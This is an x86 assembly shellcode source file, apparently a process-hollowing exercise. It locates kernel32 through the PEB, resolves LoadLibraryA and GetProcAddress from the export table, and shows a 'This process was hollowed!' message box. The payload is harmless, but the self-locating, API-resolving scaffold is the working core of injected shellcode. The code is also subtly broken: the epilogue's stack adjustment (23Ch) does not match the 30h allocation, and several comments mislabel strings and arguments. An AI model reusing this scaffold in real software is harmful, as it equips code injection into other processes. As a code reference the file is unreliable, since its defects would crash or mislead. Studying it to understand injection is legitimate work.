.686p 
.xmm
.model flat,c
.stack 4096


; include C libraries
includelib      msvcrtd

.code
        
public  main

main proc

    ; define local variables

    addr_of_getProcAddress= dword ptr -30h
    addr_of_loadLibraryA= dword ptr -2Ch
    ordinal_table_addr= dword ptr -28h
    name_pointer_table_addr= dword ptr -24h
    address_table_addr= dword ptr -20h
    msgBoxAcaptionStr= dword ptr -1Ch
    msgBoxAtextStr= dword ptr -18h
    msgBoxAstr= dword ptr -14h
    user32DllStr= dword ptr -10h
    getProcAddressStr= dword ptr -0Ch
    LoadLibraryAstr= dword ptr -08h
    image_base= dword ptr -04h

    push eax ; Save all registers
    push ebx
    push ecx
    push edx
    push esi
    push edi

    push ebp
	mov ebp, esp
	sub esp, 30h 			; Allocate memory on stack for local variables

    
    call find_shellcode_real_address    ; makes rip (curr instruction register) get pushed to the stack

    find_shellcode_real_address:
        pop     edi    ; store address of shellcode
    
    mov     esi, offset find_shellcode_real_address    ; store "fake" address of shellcode

    mov	    eax, LABEL_STR_LOADLIBRARYA     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + loadLibraryAstr], eax    ; name LoadLibraryA

    mov	    eax, LABEL_STR_GETPROCADDRESS     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + getProcAddressStr], eax    ; name GetProcAddress

    mov	    eax, LABEL_STR_USER32DLL     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + user32DllStr], eax    ; name user32.dll

    mov	    eax, LABEL_STR_MSGBOXA     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + msgBoxAstr], eax    ; name MessageBoxA

    mov	    eax, LABEL_STR_MSGBOXA_TEXT     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + msgBoxAtextStr], eax    ; name (whatever is in text)

    mov	    eax, LABEL_STR_MSGBOXA_CAPTION     ; get address of str
    sub     eax, esi    ; get difference
    add     eax, edi    ; add real_shellcode_address
    mov     [ebp + msgBoxAcaptionStr], eax    ; name LoadLibraryA
    
    ; no need for real and fake address of shellcode anymore, since we finished with constants
    

    ASSUME fs:nothing

    mov     eax, fs:[30h]     ; Get pointer to PEB

    ASSUME FS:ERROR

    mov     eax, [eax + 0Ch]    ; Get pointer to PEB_LDR_DATA
    mov     eax, [eax + 14h]    ; Get pointer to first entry in InMemoryOrderModuleList
    mov     eax, [eax]  ; Get pointer to second (ntdll.dll) entry in InMemoryOrderModuleList
    mov     eax, [eax]   ; Get pointer to third (kernel32.dll) entry in InMemoryOrderModuleList
    mov     eax, [eax + 10h]    ; Get kernel32.dll image base
    mov     [ebp + image_base], eax ; save image base

    add     eax, [eax + 3Ch]    ; get to e_lfanew
    mov     eax, [eax + 78h]    ; get RVA of DataDirectory[0] - exports directory 
    add     eax, [ebp + image_base]     ; add image base get to DataDirectory[0] - exports directory
    
    ; Now, as eax contains the address of DataDirectory[0], we can traverse it to find what we need

    mov     ebx, [eax + 1Ch]    ; get RVA of address table
    add     ebx, [ebp + image_base]     ; add image base to get to address table
    mov     [ebp + address_table_addr], ebx

    mov     ebx, [eax + 20h]    ; get RVA of name pointer table
    add     ebx, [ebp + image_base]     ; add image base to get to name pointer table
    mov     [ebp + name_pointer_table_addr], ebx

    mov     ebx, [eax + 24h]    ; get RVA of ordinals table
    add     ebx, [ebp + image_base]     ; add image base to get to ordinals table
    mov     [ebp + ordinal_table_addr], ebx

    mov     edx, [eax + 14h]    ; number of exported functions

    xor     eax, eax   ; reset counter to 0

    LOOP_TO_FIND_LOADLIBRARYA:
        mov     edi, [ebp + name_pointer_table_addr]    ; address of name pointer table
        mov     esi, [ebp + LoadLibraryAstr]     ; name LoadLibraryA
        
        cld
        mov     edi, [edi + eax * 4]    ; edx = RVA nth entry (RVA of name string)

        add     edi, [ebp + image_base] ; add image base
        mov     ecx, lenLoadLibraryAstr
        repe    cmpsb     ; compare the first (length of LoadLibraryA) bytes

        jz FOUND_LOADLIBRARYA

        inc     eax
        cmp     eax, edx
        jb      LOOP_TO_FIND_LOADLIBRARYA

        FOUND_LOADLIBRARYA:
            mov     ecx, [ebp + ordinal_table_addr]     ; address of ordinal table
            mov     edx, [ebp + address_table_addr]     ; address of address table

            mov     ax, [ecx + eax * 2]    ; ordinal number
            mov     eax, [edx + eax * 4]    ; get RVA of function
            add     eax, [ebp + image_base]    ; get to address of function
            mov     [ebp + addr_of_loadLibraryA], eax
    
    
    xor     eax, eax    ; reset counter to 0

    LOOP_TO_FIND_GETPROCADDRESS:
        mov     edi, [ebp + name_pointer_table_addr]    ; address of name pointer table
        mov     esi, [ebp + getProcAddressStr]     ; name GetProcAddress
        
        cld
        mov     edi, [edi + eax * 4]    ; edx = RVA nth entry (RVA of name string)

        add     edi, [ebp + image_base] ; add image base
        mov     ecx, lenGetProcAddressStr
        repe    cmpsb     ; compare the first (length of GetProcAddress) bytes

        jz FOUND_GETPROCADDRESS

        inc     eax
        cmp     eax, edx
        jb      LOOP_TO_FIND_GETPROCADDRESS

        FOUND_GETPROCADDRESS:
            mov     ecx, [ebp + ordinal_table_addr]     ; address of ordinal table
            mov     edx, [ebp + address_table_addr]     ; address of address table

            mov     ax, [ecx + eax * 2]     ; ordinal number
            mov     eax, [edx + eax * 4]    ; get RVA of function
            add     eax, [ebp + image_base]    ; get to address of function
            mov     [ebp + addr_of_getProcAddress], eax

    USE_FUNCTIONS_TO_CALL_MSGBOX:
        
        ; Load user32.dll, Get address of MessageBoxA using GetProcAddress, and call it with the correct arguments.

        ; use LoadLibraryW to load user32.dll

        mov     eax, [ebp + addr_of_loadLibraryA]
        push    [ebp + user32DllStr]    ; name user32.dll
        call    eax     ; eax now contains the addr of LoadLibraryA

        mov     ebx, eax   ; LoadLibraryA returns a handle to the dll it loads.


        ; use getProcAddress to get address of MessageBoxA

        mov     eax, [ebp + addr_of_getProcAddress]

        push    [ebp + msgBoxAstr]      ; name MessageBoxA
        push    ebx     ; the handle of user32.dll
        call    eax

        ; eax contains the return of GetProcAddress, which is the address of MessageBoxA
        

        ; finally, call MessageBoxA!

        push    0   ;   hWnd
        push    [ebp + msgBoxAcaptionStr]  ;   lpText
        push    [ebp + msgBoxAtextStr]     ;   lpCaption
        push    0   ;   uType

        call    eax

        

    MAIN_END:

    add     esp, 23Ch

    pop ebp 		; restore all registers and exit
	pop edi
    pop esi
	pop edx
	pop ecx
	pop ebx
	pop eax

	retn

    LABEL_STR_LOADLIBRARYA:
        loadLibraryAstrInLabel db "LoadLibraryA", 0
        lenLoadLibraryAstr equ $ - loadLibraryAstrInLabel

    LABEL_STR_GETPROCADDRESS:
        getProcAddressStrInLabel db "GetProcAddress", 0
        lenGetProcAddressStr equ $ - getProcAddressStrInLabel

    LABEL_STR_USER32DLL:
        user32InLabel db "user32.dll", 0

    LABEL_STR_MSGBOXA:
        msgBoxAinLabel db "MessageBoxA", 0

    LABEL_STR_MSGBOXA_TEXT:
        msgBoxAtextInLabel db "This process was hollowed!", 0

    LABEL_STR_MSGBOXA_CAPTION:
        msgBoxAcaptionInLabel db "Boo.", 0

main endp

        end